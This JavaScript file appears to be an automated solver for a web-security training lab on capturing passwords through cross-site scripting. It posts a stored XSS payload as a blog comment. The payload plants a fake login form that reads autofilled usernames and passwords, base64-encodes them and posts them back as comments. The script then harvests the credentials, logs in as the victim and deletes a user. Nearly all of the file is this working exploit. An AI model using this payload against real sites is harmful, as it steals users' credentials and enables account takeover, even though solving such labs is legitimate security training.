const {
  deleteCarlos,
  labLogin,
  openFirstBlogPost,
  runLab,
  submitComment,
} = require('./_common.cjs');

const TITLE = 'Exploiting cross-site scripting to capture passwords';
const PATH = '/web-security/cross-site-scripting/exploiting/lab-capturing-passwords';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const postUrl = await openFirstBlogPost(page, labUrl);
    const payload = `<form autocomplete="on"><input name="username" id="username"><input type="password" name="password" onchange="const form=document.querySelector('form[action*=\\"/post/comment\\"]')||document.querySelector('form');if(form){const body=new URLSearchParams(new FormData(form));body.set('comment','CREDS:'+btoa(username.value+':'+this.value)+':END');if(body.has('name'))body.set('name','leaker');if(body.has('author'))body.set('author','leaker');if(body.has('email'))body.set('email','leaker@example.com');if(body.has('website'))body.set('website','');fetch(form.getAttribute('action')||'/post/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body.toString(),credentials:'include'});}"></form>`;

    await submitComment(page, payload);
    console.log(`Posted payload to ${postUrl}`);

    let capturedUser = '';
    let capturedPass = '';
    for (let attempt = 0; attempt < 24 && !capturedPass; attempt += 1) {
      // eslint-disable-next-line no-await-in-loop
      await page.waitForTimeout(3000);
      // eslint-disable-next-line no-await-in-loop
      await page.goto(postUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
      // eslint-disable-next-line no-await-in-loop
      const html = await page.content();
      // eslint-disable-next-line no-await-in-loop
      const encoded = html.match(/CREDS:([A-Za-z0-9+/=]+):END/)?.[1] || '';
      if (!encoded) {
        continue;
      }
      try {
        const decoded = Buffer.from(encoded, 'base64').toString('utf8');
        [capturedUser, capturedPass] = decoded.split(':', 2);
      } catch {}
    }

    if (!capturedUser || !capturedPass) {
      throw new Error('Victim credentials not captured into comments');
    }

    await page.goto(labUrl + '/logout', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    await labLogin(page, labUrl, capturedUser, capturedPass);
    await deleteCarlos(page, labUrl);
  },
});
